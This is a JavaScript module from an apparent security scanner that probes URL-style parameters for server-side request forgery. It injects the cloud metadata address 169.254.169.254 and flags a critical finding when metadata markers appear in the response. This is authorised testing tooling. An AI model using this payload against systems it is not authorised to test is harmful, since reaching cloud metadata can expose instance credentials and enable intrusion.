// Dark Matter rule-based scanner — SSRF probe (v1).
// Hunts URL-fetching parameters and tests cloud-metadata exfiltration;
// the oracle is a metadata marker echoed in the response (oobHit).
// A full OOB collaborator listener is a documented next step.
const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';
const URL_PARAM_RE = /^(url|uri|image|img|src|source|fetch|feed|redirect|next|callback|webhook)$/i;

async function get(url, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, { signal: ctrl.signal, headers: { 'User-Agent': UA, ...(opts.headers || {}) } });
    return await res.text().catch(() => '');
  } finally {
    clearTimeout(t);
  }
}

function withParam(url, name, value) {
  const u = new URL(url);
  u.searchParams.set(name, value);
  return u.toString();
}

export async function probeSsrf(url, params, opts = {}) {
  const findings = [];
  const candidates = params.filter((p) => URL_PARAM_RE.test(p));
  for (const param of candidates.slice(0, 5)) {
    let body;
    try {
      body = await get(
        withParam(url, param, 'http://169.254.169.254/latest/meta-data/'),
        opts
      );
    } catch {
      continue;
    }
    if (/ami-id|instance-id|meta-data/.test(body)) {
      findings.push({
        class: 'ssrf',
        id: `ssrf-metadata-${param}`,
        title: `SSRF in parameter '${param}' — cloud metadata reachable`,
        severity: 'critical',
        url,
        param,
        evidence: {
          request: `GET ${withParam(url, param, 'http://169.254.169.254/latest/meta-data/')}`,
          response: 'cloud metadata markers present in the response',
          impact_demo: 'the server-side fetcher reached 169.254.169.254',
          oobHit: true,
        },
      });
    }
  }
  return findings;
}
